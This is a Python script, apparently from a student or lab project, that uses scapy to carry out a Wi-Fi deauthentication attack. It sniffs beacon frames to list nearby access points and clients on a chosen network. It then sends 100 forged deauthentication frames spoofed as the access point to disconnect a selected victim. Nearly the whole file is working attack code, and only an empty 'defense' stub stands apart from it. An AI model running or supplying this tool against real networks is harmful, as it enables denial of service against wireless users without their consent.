from scapy.all import *
import os
import sys
import sys
import time
import random
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt
import change_modes
import helper

"""
Information learned:
addr1: destination MAC , addr2: source MAC,  addr3: AP MAC
"""

interface_name = ""
chosen_ap_mac = ""
ap_list = list()
ssid_list = list()
users = list()


def AP_handler(pkt):
    global ap_list
    # Checking if the packets have a 802.11 layer and only of type beacon
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
        mac_addr = pkt[Dot11].addr2
        ap_name = pkt[Dot11Elt].info.decode()
        if mac_addr not in [ap[0] for ap in ap_list]:
            channel = pkt[Dot11Beacon].network_stats().get("channel")
            ap_list.append([mac_addr, ap_name, channel])
            print(f"\tFound new AP: {ap_name}")


def users_handler(pkt):
    global users, chosen_ap_mac
    if (pkt.addr2 == chosen_ap_mac or pkt.addr3 == chosen_ap_mac) and \
            pkt.addr1 not in users and \
            pkt.addr1 != "ff:ff:ff:ff:ff:ff" and \
            pkt.addr1 != pkt.addr2 and \
            pkt.addr1 != pkt.addr3:
        users.append(pkt.addr1)
        print(f"{len(users)}\t{pkt.addr1}")


def scan_wlan(iface):
    print("\n\nScanning for access points...")
    print("Index\tAP Name\t\tMAC")
    for channel in range(1, 15):
        helper.scan_channels(iface, channel)
        sniff(iface=iface, count=0, prn=AP_handler, timeout=1)


def scan_for_users(iface):
    print("\n\nScanning for users...")
    print("Index\tUser MAC")
    for channel in range(1, 3):
        helper.scan_channels(iface, channel)
        sniff(iface=iface, prn=users_handler, timeout=10)


def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
    # RadioTap is an additional layer, making it easier to transmit info between OSI Layers.
    # First layer being a 802.11 layer with our input info for the attack
    # Second Layer being the Deauthentication DoS step: reason=1 -> unspecified reason
    packet = RadioTap() \
             / Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr) \
             / Dot11Deauth(reason=1)
    # Send 100 packets with a 0.1 interval between each packet to ensure proper de-authentication
    sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)


def scan_captured_networks(ap_list, flag):
    global chosen_ap_mac
    captured = list(enumerate(ap_list, 1))
    print("\nAccess Points Captured:\n\n")
    for key, value in captured:
        print(f"{key} - {value}")
    if len(captured) == 0:
        print("No Access Points found!\n")
        return -1
    try:
        chosen_ap = int(input("Choose an AP index to attack from the list above: "))
        chosen_ap = captured[chosen_ap - 1][1]
        print("Chosen AP is ", chosen_ap)
    except:
        print("ERROR: Choose an AP with an index from the list above")
        scan_captured_networks(ap_list)
    chosen_ap_mac = chosen_ap[0]
    if flag:
        scan_for_users(interface_name)
        choose_user_to_attack(users)
    return chosen_ap


def choose_user_to_attack(user_list):
    captured = list(enumerate(user_list, 1))
    print("\nUsers captured on chosen access point:\n\n")
    for key, value in captured:
        print(f"{key} - {value}")

    if len(captured) == 0:
        print("No users found on the chosen AP, choose another AP:\n")
        scan_captured_networks(ap_list, flag=True)
    try:
        chosen_user = int(input("Choose a user to attack from the list above: "))
        chosen_user = captured[chosen_user - 1][1]
        print("Chosen User is ", chosen_user)
    except:
        print("ERROR: Choose a user with an index from the list above")
        choose_user_to_attack(user_list)

    return chosen_user


def network_attack(iface):
    global interface_name, ap_list, users
    interface_name = iface
    change_modes.init_attack_mode()
    change_modes.active_monitor_mode(iface)

    scan_wlan(iface)
    chosen_ap = scan_captured_networks(ap_list, flag=False)

    # Found Access Points
    if chosen_ap != -1:
        scan_for_users(iface)
        victim = choose_user_to_attack(users)

    deauthenticate_victim(iface, victim, chosen_ap_mac)


def defense_attack():
    pass
